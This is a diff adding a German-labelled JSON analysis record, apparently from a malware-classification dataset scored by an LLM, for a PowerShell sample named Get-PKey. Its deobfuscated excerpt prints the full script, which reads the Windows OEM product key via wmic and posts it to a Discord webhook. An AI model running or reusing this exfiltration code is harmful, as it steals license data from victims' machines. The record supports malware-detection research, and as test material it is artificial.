@@ -1,0 +1,68 @@
+{
+  "meta": {
+    "quelldatei": "tech_032_Get-PKey.ps1",
+    "sha256": "fb747e75a7d4baba101ac605f60b7ae8589f5c008a987cacd2ac0d2ca71c7799",
+    "groesse_bytes": 639,
+    "zeilen": 27,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "application/json",
+      "Product Key: $ProductKey",
+      "DISCORD WEBHOOK"
+    ],
+    "string_anzahl_gesamt": 3,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "application/json",
+      "Product Key: $ProductKey",
+      "DISCORD WEBHOOK"
+    ],
+    "string_anzahl_gesamt": 3,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-PKey",
+      "Invoke-RestMethod",
+      "Select-Object",
+      "Send-DiscordWebhookMessage"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "application/json",
+      "Product Key: $ProductKey",
+      "DISCORD WEBHOOK"
+    ],
+    "string_anzahl_gesamt": 3,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-PKey",
+      "Invoke-RestMethod",
+      "Select-Object",
+      "Send-DiscordWebhookMessage"
+    ],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "function Send-DiscordWebhookMessage {\r\n    param (\r\n        [string]$WebhookUrl,\r\n        [string]$Message\r\n    )\r\n\r\n    $Body = @{\r\n        content = $Message\r\n    } | ConvertTo-Json\r\n\r\n    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType 'application/json'\r\n}\r\n\r\nfunction Get-PKey {\r\n    param (\r\n        [Parameter(Mandatory=$true)]\r\n        [string]$wb\r\n    )\r\n\r\n    $ProductKey = (wmic path softwarelicensingservice get OA3xOriginalProductKey | Select-Object -Skip 1).Trim()\r\n\r\n    Send-DiscordWebhookMessage -WebhookUrl $wb -Message \"Product Key: $ProductKey\"\r\n}\r\n\r\n# usage:\r\n#Get-PKey -wb 'DISCORD WEBHOOK'\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
